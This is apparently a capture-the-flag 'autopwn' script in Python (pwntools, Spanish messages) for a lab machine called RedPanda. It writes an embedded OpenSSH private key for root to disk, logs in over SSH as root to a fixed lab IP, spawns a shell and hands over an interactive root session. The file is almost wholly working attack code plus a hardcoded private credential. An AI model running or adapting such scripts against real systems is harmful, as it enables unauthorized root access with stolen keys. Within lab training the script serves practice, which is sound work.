try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn RedPanda ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

rsa = (b"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29\nugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ\nAAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ\nRwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=\n-----END OPENSSH PRIVATE KEY-----")
with open('key', 'wb') as f:
    f.write(rsa)

request = ssh(host='10.10.11.170', user='root', keyfile="key")
shell = request.process("/bin/sh")
shell.sendline(b"export HOME=/; bash")
time.sleep(0.5)
shell.sendline(b"export HOME=/root; cd; echo $(id)")
shell.interactive()
